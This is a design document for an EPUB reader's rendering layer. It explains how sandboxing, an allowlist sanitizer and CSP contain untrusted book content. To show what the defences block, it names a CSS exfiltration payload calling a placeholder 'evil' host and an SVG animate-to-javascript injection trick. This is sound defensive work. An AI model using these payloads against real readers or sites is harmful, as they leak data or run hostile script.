# View domain

## Overview

`src/view` renders a decoded `Section` as live markup a human reads, inside a frame where book-supplied script cannot execute, cannot reach the host origin, and cannot reach the network. It is the only part of the library that touches `document`, and nothing in `src/core` may import it (`npm run check:core`).

Modules: `host.ts` (`ContentHost` — the public surface), `sanitize.ts` (parse + normalize + sanitize in one pass), `allowlist.ts` (the tables that decide what survives), `css.ts` (token-level `url()`/`@import` scan), `resources.ts` (reference → `data:` URL, and applying them to a sanitized document), `reference.ts` (reference classification and relative-space joining), `frame.ts` (CSP, reset stylesheet, coordination script, document assembly), `protocol.ts` (typed messages and their validators), `text.ts` (BOM-aware decoding).

The public surface is `ContentHost`: construct it over a container element, `render(section)` it, `measure()` the result, `destroy()` it. `render()` returns a structured report of what the sanitizer removed and what the resource layer served — the demo displays it, and it is what turns "the sanitizer ran" into something observable.

## Threat model — three defences, none redundant

EPUB content is arbitrary HTML, CSS, JS and SVG from an untrusted file. The frame needs `allow-scripts`, because the host's own coordination script runs inside it and there is no other way to get measurements back across an opaque origin. `allow-scripts` is granted to the **document**, not to a party: book script would run under exactly the same grant.

- **The sandbox denies reach.** `sandbox="allow-scripts"` with no `allow-same-origin` gives an opaque origin: no host DOM, no cookies (Chromium throws rather than returning empty), no `localStorage`, `iframe.contentDocument` is `null` from outside.
- **Sanitization denies execution.** Without it, book script runs *inside* the opaque origin and can still burn CPU, phish within the frame's own pixels, attempt navigation, and — the concrete reason this is not belt-and-braces — **impersonate the host's `postMessage` protocol**, because it shares the frame's message channel with the coordination script. A sandbox cannot tell the host's script from the book's; only stripping can.
- **CSP denies egress.** `default-src 'none'` with `connect-src 'none'` blocks fetch, XHR, WebSocket and beacon; `img-src data:` blocks the CSS-only exfiltration channel (`background: url(https://evil/?leak)`).

Each layer covers a failure of the others. Do not simplify one away because another looks sufficient.

## Key decisions

- **Resources are `data:` URLs, not `blob:`** (2026-08-24). The plan called for `blob:`, and it cannot work: a blob URL belongs to the origin that created it, and the frame's origin is opaque, so the frame is refused the host's blob URLs outright. Measured in Chromium: the load fails as *"Not allowed to load local resource"* — below CSP, with no `securitypolicyviolation` event to observe — with or without a CSP, while an unsandboxed control frame loads the same URL fine. A `data:` URL carries its own bytes and has no origin to check, so it crosses the boundary the sandbox deliberately makes uncrossable. Costs: base64's 33%, and no revocation handle. Both are bounded by one section, and reflowable text books (fixed layout is permanently out of scope) do not carry the image weight that would make it hurt.
  - **The escape hatch, if memory ever bites:** blob URLs minted *inside* the frame do work (measured — `blob:null/…`, loadable as images and stylesheets, matched by CSP's `blob:` source). That would mean shipping bytes over `postMessage` and substituting them in the frame after the handshake — a second document-assembly path in the least-trusted context, and placeholder references that fetch and raise bogus CSP violations before substitution. Not worth it until a real book makes it worth it.
- **Allowlist, never blocklist.** A blocklist loses to the next vector the platform invents; an allowlist only ever loses formatting. See the allowlist section below.
- **Sanitization is unconditional and never consults `Section.scripted`.** That flag is an author declaration, not a detection: a book carrying script without declaring the property has it omitted, so gating on it would skip exactly the files that most need sanitizing. Its one legitimate use is as a diagnostic the host reports outward (`RenderReport.declaredScripted`) so a cautious consumer can refuse the book. The rendering pipeline is byte-identical either way.
- **The document enters by `srcdoc`, with CSP in a `<meta http-equiv>`.** A library with no server cannot set headers, so the meta element is the only CSP mechanism available — which costs the three header-only directives (`frame-ancestors`, `sandbox`, `report-uri`) and requires the element to be the first thing in the document, since nothing before it is covered. A `blob:` **document** URL is the trap to avoid: a blob document inherits its creator's origin, and relying on the sandbox attribute to override that is fragile when `srcdoc` gets an opaque origin unconditionally. The `csp` iframe attribute is Chrome-only and fails the Safari/Firefox baseline.
- **`script-src` names a per-render nonce rather than `'unsafe-inline'`.** A script that somehow survived sanitization still cannot run: the nonce is 128 random bits, minted per render, and unreadable by anything not already executing. It also blocks `javascript:` URLs, which need `'unsafe-inline'` in `script-src`.
- **Only image, font and stylesheet media types are minted a URL.** A reference resolving is not evidence it should be served — the seam answers for the whole manifest, so a `text/javascript` entry resolves as readily as an image, and a URL is a capability rather than a convenience. `urlForResource` serves `image/*`, `font/*` and the legacy `application/*-font-*` spellings; `urlForStylesheet` serves `text/css` only. Anything else is reported as `refused` and never loaded.
- **A minimal reset and nothing more** (`box-sizing`, zeroed body margin, `max-width:100%` on replaced content). The host must **not** put the body in a column context: layout containment forbids a contained box fragmenting across columns, which is why the paginator gives each chunk its own multi-column context. Column geometry belongs to the paginator; themes and typography to the appearance controls.

## The allowlist

`allowlist.ts` holds five tables. Elements and attributes absent from them do not survive.

- **`HTML_ELEMENTS`** — structural and inline prose elements (headings, paragraphs, lists, tables, `ruby`, `figure`, `details`), plus `img`, `link`, `style` and the EPUB 2 presentational leftovers (`center`, `tt`, `big`, `strike`) real books still use. Each maps to the attributes it may keep.
- **`HTML_GLOBAL_ATTRIBUTES`** — `class`, `id`, `dir`, `lang`, `xml:lang`, `title`, `style`, `role`, `hidden`, `translate`, `epub:type`, plus any `aria-*`. Any attribute whose lowercased name starts with `on` is removed first, before any other rule.
- **`HTML_DISCARDED`** — elements that go with everything inside them, because their children are source rather than prose: raw-text elements, form controls, and void elements with nothing to keep.
- **`SVG_ELEMENTS` / `SVG_GLOBAL_ATTRIBUTES`** — a shape-and-paint subset. SVG is matched by *local* name so `xlink:href` and `href` share one rule.
- **`SVG_DISCARDED`** — `script`, `foreignObject`, `handler`, and the SMIL animation elements. SMIL is on the list rather than merely absent from the allowlist because `<animate attributeName="href" to="javascript:…">` turns an inert element into a live one *after* sanitization has run.

Two rules are worth stating separately because they are not obvious from the tables:

- **Not-allowlisted defaults to *unwrap*, not discard** — the element goes, its children stay. A book is text before it is markup, and a malformed one nests half a chapter inside a stray element. It is also the safer choice for `<noscript>`: its content is markup when parsed with scripting off and raw text when parsed with scripting on, so an element that *survives* into the frame is re-read in the other mode and attribute boundaries move under it. Removing the element removes the reinterpretation.
- **Reference schemes are decided per attribute.** `a[href]` and `*[cite]` accept `http`, `https`, `mailto`, `tel`, a fragment, or a relative path. `img[src]`, `link[href]` and SVG `image[href]` accept `http`, `https`, `data` or a relative path. `use[href]` accepts a **fragment only** — a `data:` URI there is a document-injection vector, not an image reference — and a `<use>` left without a reference is removed rather than kept inert. Remote references are deliberately *kept*, so the CSP is the layer that refuses them, and refuses them observably.

## Parse, normalize and sanitize — one pass

`sanitizeSection(source, mediaType)` parses, normalizes and sanitizes in a single pass and returns a fresh HTML document plus a summary. They are one pass on purpose: normalization is a property of parsing as XML and re-serializing as HTML, and the sanitizer is the only place the markup is parsed at all. Parsing twice would be wasteful and a chance for the two DOMs to disagree.

1. **Parse.** `application/xhtml+xml` (or `image/svg+xml` for an SVG spine item), falling back to `text/html` on a parse error. Real books are malformed often enough that the fallback is a routine outcome, not a corrupt book.
2. **Flatten.** Comments and processing instructions are removed (they serialize raw and can break out of the markup on the way back into the frame); CDATA sections become text nodes, because an HTML document cannot hold CDATA and EPUB wraps stylesheets in it constantly.
3. **Scrub.** Depth-first: discard, unwrap, or keep-and-scrub-attributes.
4. **Import into a fresh HTML document.** This is what structurally retires the self-closing-tag trap: an XHTML `<a id="x"/>` re-serializes as `<a id="x"></a>` because the HTML serializer emits an end tag for every non-void element. **Never attempt this with a regex.**
5. **Apply resources** (async — see below), then serialize `head.innerHTML` and `body.innerHTML` into the frame document.

## Resources

`ResourceRegistry` wraps `Section.resolve?()` and turns references into `data:` URLs, memoized **by normalized reference string** — the seam promises equal bytes for equal references, never one shared `Resource` object. `applyResources()` walks the sanitized document and rewrites `link[href]`, `<style>` text, `style` attributes, `img[src]` and SVG `image[href]`.

- **CSS references are relative to the stylesheet, not to the section — and `Section.resolve()` only understands section-relative references.** A sheet at `OEBPS/styles/main.css`, reached from a section at `OEBPS/text/`, writes `@import url("second.css")`; resolving that string straight from the section lands on `OEBPS/text/second.css` and returns `undefined`. So each nested reference is composed in relative space first (`joinReference(stylesheetReference, nestedReference)`) and only then resolved. Get this wrong and every stylesheet silently resolves to nothing while section-level images still work — a failure that looks like success.
- **`@import` targets become nested `data:text/css` URLs rather than being inlined.** Inlining would need the statement's extent, and would lose the media queries and layer syntax an `@import` can carry. Nesting costs another 33% per level; real books nest once or twice.
- **Cycles terminate by ancestor set.** `urlForStylesheet` carries the chain of sheets it is nested inside; a sheet that is already its own ancestor returns `undefined` and the `@import` becomes `about:invalid`. An in-flight set would give false positives the moment two sheets import the same third one.
- **`undefined` from `resolve()` is routine, not damage.** Fragment-only references, `data:`/`mailto:`/`tel:` and absolute URLs all return it by design, as do a file present in the archive but absent from the manifest and a declared item whose entry is missing. Only the last two mean "this should have worked".
- **Unresolvable `<img>` degrades to its `alt` text as a text node.** Gutenberg's ebookmaker sets each chapter's drop cap as `<img alt="T">`; dropping the image silently deletes the first letter of every chapter. An empty `alt` means decorative, and the element is removed.
- **Unresolvable references in CSS become `url("about:invalid")`**, never the original relative path: a `srcdoc` document inherits the *parent's* base URL, so a surviving relative reference would aim a request at the host's own origin.

## Protocol

Typed, versioned, and validated on receipt at both ends. `PROTOCOL_VERSION` is `1`; every message carries it as `v` and anything else is dropped.

Origin cannot authenticate here: the frame's origin is `'null'`, which identifies nothing. The host trusts a message only when `event.source === iframe.contentWindow` **and** it validates (`asFrameMessage`). The frame trusts a message only when `event.source === window.parent` and it validates. Everything else is ignored, never dispatched. Because the frame's origin is opaque, host→frame messages must use `'*'` as `targetOrigin`; the payloads carry nothing confidential for that reason. Frame→host messages target the host's real origin when it has one.

Host → frame:

| message | payload | reply |
|---|---|---|
| `ping` | `id` | `pong` |
| `measure` | `id` | `measured` |

Frame → host:

| message | payload | when |
|---|---|---|
| `ready` | — | on `DOMContentLoaded`, once per document. The handshake `render()` awaits. |
| `pong` | `id` | answering `ping` |
| `measured` | `id`, `width`, `height` | answering `measure`; the content root's scroll size |
| `violation` | `directive`, `blockedUri` | a `securitypolicyviolation` event in the frame |
| `error` | `message` | an uncaught error in the frame |

The coordination script sits in `<head>`, immediately after the CSP element, so violations raised while the body is still parsing are already being listened for; it announces `ready` on `DOMContentLoaded`, not on evaluation. It also cancels the default action of every in-frame link click: navigation is the next milestone's, and until then a click must not take the frame away from the chapter. The frame's validator is a hand-written copy of `asHostMessage` inside a template string — it cannot import, so the two must be kept in step by hand.

## Gotchas

- **A blob URL created by the host is unreachable from the frame.** It is not a CSP failure and raises no violation event; it simply does not load. Any future "just use a blob URL" simplification is a regression.
- **Chromium and Firefox report XML parse errors differently.** Firefox makes `parsererror` the document element in its own namespace; Chromium makes it the *first child* of the root, in the XHTML namespace. Check both, or a malformed book renders as a truncated tree with the browser's red error box wedged into the chapter.
- **`</noscript>` after an open `<p>` is ignored by the HTML parser** ("any other end tag" stops at the first special element), so an unclosed `<noscript>` swallows the rest of the document. This is why `noscript` is unwrapped rather than discarded.
- **A `<style>` element serializes raw.** XHTML lets an author put `</style>` inside CSS text, which would escape back into markup on the way into the frame; such a stylesheet is dropped whole. HTML-serialized attribute values and text nodes are escaped for you — raw-text elements are the only hole.
- **The frame's cookie access throws rather than returning empty** under an opaque origin in Chromium. Tests should accept either.
- **`ContentHost.render()` refuses a superseded render.** Two overlapping renders would leave the first one's resources untracked, so the earlier call rejects with `ContentHostError`. Callers that let a user click through a table of contents should serialize their renders (the demo chains them on a promise).
- **`epub:type` survives as a literal attribute name**, so a publisher selector written `[epub|type~="pagebreak"]` will not match in the frame; `[epub\:type]` does.

## Known gaps

- **MathML is unwrapped, not rendered.** Its elements are absent from the allowlist, so equations degrade to run-together text. `<annotation-xml encoding="text/html">` is a known injection surface and a MathML allowlist needs designing rather than guessing.
- **`<audio>`, `<video>` and media overlays are unwrapped.** EPUB 3 media overlays are not supported at all yet.
- **Obfuscated fonts decode to garbage and will not load.** De-obfuscation is decoder work — see [`epub.md`](epub.md).
- **Only Chromium is verified.** Safari and Firefox parse-error shapes, opaque-origin cookie behaviour, and `data:` stylesheet handling are unverified by test.

## The boundary with the paginator

The host hands over a **normalized, sanitized document**, not "sanitized bytes" — the paginator chunks what the host produced, and must not re-parse. The host owns markup normalization and image/alt policy because both require the parsed tree. It does **not** own column geometry, chunking, page↔position mapping, or measurement beyond the single `measure` message; and it must never impose a column context on the body.

Two negative duties matter to the paginator: zero-width anchor spans (`<span class="…"><a id="page_357"></a></span>`) are **not** tidied away — they are what fragment navigation and reading positions resolve against — and empty inline elements are left alone, because their empty `getClientRects()` is the paginator's problem to guard, not the host's to prevent.
